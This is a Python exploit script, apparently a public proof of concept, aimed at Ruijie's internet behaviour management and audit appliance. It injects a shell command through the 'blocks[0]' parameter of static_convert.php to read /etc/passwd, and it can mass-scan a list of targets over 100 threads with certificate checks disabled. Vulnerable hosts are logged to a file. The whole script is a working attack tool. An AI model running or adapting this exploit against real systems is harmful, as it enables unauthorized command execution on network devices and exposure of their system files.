import requests
import sys
import argparse
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


def banner():
    banner = """

 .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |  _______     | || | _____  _____ | || |     _____    | || |     _____    | || |     _____    | || |  _________   | |
| | |_   __ \    | || ||_   _||_   _|| || |    |_   _|   | || |    |_   _|   | || |    |_   _|   | || | |_   ___  |  | |
| |   | |__) |   | || |  | |    | |  | || |      | |     | || |      | |     | || |      | |     | || |   | |_  \_|  | |
| |   |  __ /    | || |  | '    ' |  | || |      | |     | || |   _  | |     | || |      | |     | || |   |  _|  _   | |
| |  _| |  \ \_  | || |   \ `--' /   | || |     _| |_    | || |  | |_' |     | || |     _| |_    | || |  _| |___/ |  | |
| | |____| |___| | || |    `.__.'    | || |    |_____|   | || |  `.___.'     | || |    |_____|   | || | |_________|  | |
| |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 

                                version:1.1.0
                                author:fanerj
"""
    print(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description='锐捷统一上网行为管理与审计系统 命令执行')
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()
    # 判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        # 多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload_url = "/view/IPV6/naborTable/static_convert.php?blocks[0]=||cat%20%2fetc%2fpasswd"
    url = target + payload_url
    try:
        res = requests.get(url=url, verify=False, timeout=10)
        if res.status_code == 200 and 'root' in res.text:
            print(f"{GREEN}[+] {target} 存在任意文件读取漏洞{RESET}")
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + "\n")
            return True
        else:
            print(f"[-] {target} 不存在漏洞")
    except Exception as e:
        print(f"[*] {target} 存在问题: {e}")
    return False


if __name__ == '__main__':
    main()
